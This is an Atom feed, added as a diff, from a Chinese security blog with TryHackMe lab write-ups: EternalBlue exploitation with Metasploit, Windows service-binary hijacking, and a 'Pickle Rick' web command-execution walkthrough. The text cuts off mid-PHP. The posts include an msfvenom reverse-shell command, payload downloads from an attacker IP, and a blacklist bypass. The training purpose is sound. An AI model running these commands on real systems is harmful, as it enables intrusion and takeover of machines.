@@ -1,0 +1,398 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://k1t0111.github.io</id>
+    <title>K1t0 • Posts by &#34;tryhackme-room&#34; category</title>
+    <link href="https://k1t0111.github.io" />
+    <updated>2024-03-19T14:06:27.000Z</updated>
+    <category term="ctfmisc" />
+    <category term="小小简单靶场" />
+    <category term="wp集合" />
+    <category term="ctfweb" />
+    <category term="sql学习" />
+    <category term="linux提权" />
+    <category term="tryhackme" />
+    <category term="windows" />
+    <entry>
+        <id>https://k1t0111.github.io/2024/03/19/blue/</id>
+        <title>Blue靶场实践</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/03/19/blue/"/>
+        <content type="html">&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/09/RHPXj7nO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;阅读须知&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阅读须知&#34;&gt;#&lt;/a&gt; 阅读须知：&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;探索者安全团队技术文章仅供参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者&lt;br /&gt;
+本人负责，作者不为此承担任何责任，如有侵权烦请告知，我们会立即删除并致歉，创作不易转载请标明出处。感谢！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;师傅: K1t0    &lt;a href=&#34;https://k1t0111.github.io&#34;&gt;https://k1t0111.github.io&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#信息收集&#34;&gt;#&lt;/a&gt; 信息收集&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;今天来打一打简单靶场 ......&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;循例 对机器进行扫描  鉴于很简单 直接快点带过&lt;/p&gt;
+&lt;p&gt;直接扫描 tcp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/28/zbuJyuVT.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;开放 445 和 135 139 端口 直接一看 445 就可能使永恒之蓝    并且给出很可能就是 win7 -win10&lt;/p&gt;
+&lt;p&gt;不说别的 最好的 直接上 msf 直接先看一遍 是不是永恒之蓝&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;exploit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#exploit&#34;&gt;#&lt;/a&gt; exploit&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;话不多说  msfconsole&lt;/p&gt;
+&lt;p&gt;直接搜一下 search ms17-010 看到出现四个模块 路径&lt;/p&gt;
+&lt;p&gt;直接用 use exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
+&lt;p&gt;设置一下 set rhost 10.10.225.254&lt;/p&gt;
+&lt;p&gt;废话不多说直接上图&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/28/iw2Pw8Hy.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;先 check 看看究竟是不是这个漏洞&lt;/p&gt;
+&lt;p&gt;结果正确易受攻击&lt;/p&gt;
+&lt;p&gt;直接 run 开打获取 meterpreter&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/28/fbOim5wd.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;successful  !!!&lt;/p&gt;
+&lt;p&gt;PS: 其实这个靶场中还涉及了 可以将 shell 转化成 meterpreter&lt;/p&gt;
+&lt;p&gt;shell_to_meterpreter&lt;/p&gt;
+&lt;p&gt;同时可以用 ps 命令查看进程 可以将我们的 meterpreter 移交到另一个进程中通过 migrate&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;post&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#post&#34;&gt;#&lt;/a&gt; post&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其实已经打完了&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/29/tXZZJQVC.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;已经是 system 没什么好说的 直接在根目录找到 flag1.txt&lt;br /&gt;
+ 其他的 flag 分别在 用户等常规地方找吧.....&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;总结&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#总结&#34;&gt;#&lt;/a&gt; 总结&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;基础..........&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="小小简单靶场" />
+        <updated>2024-03-19T14:06:27.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/</id>
+        <title>win提权第二弹服务提权</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/03/19/win%E6%8F%90%E6%9D%83%E7%AC%AC%E4%BA%8C%E5%BC%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83/"/>
+        <content type="html">&lt;h1 id=&#34;0x01-windows服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-windows服务&#34;&gt;#&lt;/a&gt; 0X01 windows 服务&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Windows 服务由服务控制管理器 (SCM) 管理。 SCM 是一个负责根据需要管理服务状态、检查任何给定服务的当前状态并通常提供配置服务的方法的进程。&lt;/p&gt;
+&lt;p&gt;其次我们可以知道 windows 服务是 与 exe 可执行文件相关，同时 我们可以知道服务需要指定一个用户，因此我们能够想到什么 就是上次我们分享到 计划任务&lt;/p&gt;
+&lt;p&gt;如果我们能够也获得相应 exe 文件的修改权限我们是否可以根据这个权限，执行一个 payload 获取到相应服务指定用户的权限&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;0x02-靶场实践&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-靶场实践&#34;&gt;#&lt;/a&gt; 0x02 靶场实践&lt;/h1&gt;
+&lt;h2 id=&#34;查找-windows服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查找-windows服务&#34;&gt;#&lt;/a&gt; 查找 windows 服务&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;首先找一找服务 选一个服务 看到了 WindowsScheduler&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/18/1mRaN220.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我们可以看到 执行的二进制文件 C:\PROGRA&lt;sub&gt;2\SYSTEM&lt;/sub&gt;1\WService.exe&lt;/p&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限&#34;&gt;#&lt;/a&gt; 权限&lt;/h2&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;看看权限&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/18/9899R1FF.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其实这个时候我们就可以看到 我们 everyone 组有读写权限 有权限就好办&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload&#34;&gt;#&lt;/a&gt; payload&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;msfvenom  -p windows/x64/shell_reverse_tcp  LHOST=10.11.69.232 LPORT=4444 -f exe-service  -o 1.exe&lt;/p&gt;
+&lt;p&gt;生成一个 服务的二进制文件 可以直接连接的&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;h2 id=&#34;载荷投递&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#载荷投递&#34;&gt;#&lt;/a&gt; 载荷投递&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;kali 建立 http 服务&lt;/p&gt;
+&lt;p&gt;在受害机器中 wget &lt;a href=&#34;http://ip:8000/1.exe&#34;&gt;http://ip:8000/1.exe&lt;/a&gt; -O rev-svc.exe&lt;/p&gt;
+&lt;p&gt;应该是 wget 可以在 powershell 中使用不过这是个安装了 wget&lt;/p&gt;
+&lt;p&gt;正常应该是使用&lt;/p&gt;
+&lt;p&gt;Invoke-WebRequest  -Uri  &amp;quot;&lt;a href=&#34;https://10.11.69.232/1.exe&#34;&gt;https://10.11.69.232/1.exe&lt;/a&gt;&amp;quot;  -OutFile&amp;quot;1.exe&amp;quot;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&amp;lt;br/&amp;gt;&lt;/p&gt;
+&lt;h2 id=&#34;修改替换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#修改替换&#34;&gt;#&lt;/a&gt; 修改替换&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;此时我们正常会想到什么？那肯定是利用我们的权限然后直接覆盖掉服务的 exe 文件&lt;/p&gt;
+&lt;p&gt;直接 找到  \PROGRA&lt;sub&gt;2\SYSTEM&lt;/sub&gt;1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/19/JuZV7N1q.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;又试了 shell&lt;br /&gt;
+Move-Item -Path &amp;quot;C:\Users\thm-unpriv\1.exe&amp;quot; -Destination &amp;quot;C:\PROGRA&lt;sub&gt;2\SYSTEM&lt;/sub&gt;1\WService.exe&amp;quot; 完美解决 直接将我们的 1.exe 换成了&lt;/p&gt;
+&lt;p&gt;此时查看权限我们应该是由 完整的拥有这个文件的所有权限&lt;/p&gt;
+&lt;p&gt;但是此时我们不仅是要看我们有这个权限我们还要看 我们要运行的服务的目标账户有没有权限&lt;/p&gt;
+&lt;p&gt;要把权限 给足 直接就是 icacls 服务 /grant Everyone:F&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;get-shell&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#get-shell&#34;&gt;#&lt;/a&gt; get shell&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;直接 nc -lvp 4444&lt;/p&gt;
+&lt;p&gt;启动服务连接&lt;/p&gt;
+&lt;/blockquote&gt;
+</content>
+        <category term="小小简单靶场" />
+        <updated>2024-03-19T14:06:27.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/03/13/Rick/</id>
+        <title>Rick_pickle</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/03/13/Rick/"/>
+        <content type="html">&lt;h1 id=&#34;阅读须知&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阅读须知&#34;&gt;#&lt;/a&gt; 阅读须知：&lt;/h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;探索者安全团队技术文章仅供参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作，由于传播、利用本公众号所提供的技术和信息而造成的任何直接或者间接的后果及损失，均由使用者&lt;br /&gt;
+本人负责，作者不为此承担任何责任，如有侵权烦请告知，我们会立即删除并致歉，创作不易转载请标明出处。感谢！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr /&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/03/9YuPkhCM.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;今天 K1t0 带来 Pickle Rick&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;0x01-信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x01-信息收集&#34;&gt;#&lt;/a&gt; 0x01 信息收集&lt;/h1&gt;
+&lt;h2 id=&#34;0x02-tcp端口扫描&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x02-tcp端口扫描&#34;&gt;#&lt;/a&gt; 0x02 tcp 端口扫描&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;我直接用了全端口扫描 扫描全部端口 并且扫描操作系统&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/13/vLjT3dQO.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x03-udp端口扫描以及服务版本识别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x03-udp端口扫描以及服务版本识别&#34;&gt;#&lt;/a&gt; 0x03 udp 端口扫描以及服务版本识别&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;这部分不做赘述 还是老套路 -sV.....&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;0x04-端口查看&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#0x04-端口查看&#34;&gt;#&lt;/a&gt; 0x04 端口查看&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;发现主机开放 80 22 端口 22 端口先放一边 ssh 爆破最后的选择&lt;br /&gt;
+访问 80 端口&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h1 id=&#34;1x01-web突破&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1x01-web突破&#34;&gt;#&lt;/a&gt; 1x01 web 突破&lt;/h1&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/13/B4DFX8i7.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;好好好 Rick 急需帮助   &lt;strong&gt;BURRRRRRRRP&lt;/strong&gt; 这玩意就很奇特&lt;br /&gt;
+发现它是口头语&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;1x02-web信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1x02-web信息收集&#34;&gt;#&lt;/a&gt; 1x02 web 信息收集&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;继续找找还是老套路 各种信息识别&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;Web 服务器
+Apache HTTP Server 2.4.18
+操作系统
+Ubuntu
+JavaScript 库
+jQuery 3.3.1
+用户界面（UI）框架
+Bootstrap 3.4.0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;blockquote&gt;
+&lt;p&gt;对味了，扫个目录吧&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/14/6fvD0G5n.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;扫完目录之后发现了 一些新东西 但是先等等 我们不放过任何蛛丝马迹&lt;br /&gt;
+一眼定睛  源代码:&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!--&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   Note to self, remember username!&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;   Username: R1ckRul3s&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;1x03-web利用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1x03-web利用&#34;&gt;#&lt;/a&gt; 1x03 web 利用&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;得到一个用户名 才开始猜测可能是 ssh 的 试了一下发现 ssh 只能允许私钥连接&lt;br /&gt;
+回到目录 找找别的资产 robots.txt 老目录了 看一眼&lt;br /&gt;
+ Wubbalubbadubdub&lt;br /&gt;
+ 又是口头禅&lt;br /&gt;
+看看 login.php 需要登陆&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/14/pfDtE5Td.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;用户名：R1ckRul3s  密码：Wubbalubbadubdub&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;1x04-rce漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1x04-rce漏洞&#34;&gt;#&lt;/a&gt; 1x04 rce 漏洞&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;进去之后只有 commands 标签有命令执行的功能点:&lt;br /&gt;
+ 其他都是禁止访问&lt;br /&gt;
+ ls 一下&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://img2.imgtp.com/2024/03/14/RKC30Ni0.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;试了一下 cat 命令被 ban 了用 tac&lt;br /&gt;
+ 读了&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;denied.php&lt;/li&gt;
+&lt;li&gt;index.html&lt;/li&gt;
+&lt;li&gt;login.php&lt;/li&gt;
+&lt;li&gt;portal.php&lt;br /&gt;
+ 其他都没啥用 看看 portal&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token php language-php&#34;&gt;&lt;span class=&#34;token delimiter important&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function-definition function&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword type-hint&#34;&gt;array&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$arr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$arr&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;stripos&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;!==&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// Cant use cat&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token variable&#34;&gt;$cmds&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;cat&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;head&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;more&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;tail&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;nano&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;vim&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;vi&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;command&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;contains&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_POST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;command&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$cmds&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;&amp;lt;/br&gt;&amp;lt;p&gt;&amp;lt;u&gt;Command disabled&amp;lt;/u&gt; to make it hard for future &amp;lt;b&gt;PICKLEEEE RICCCKKKK&amp;lt;/b&gt;.&amp;lt;/p&gt;&amp;lt;img src=&#39;assets/fail.gif&#39;&gt;&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token 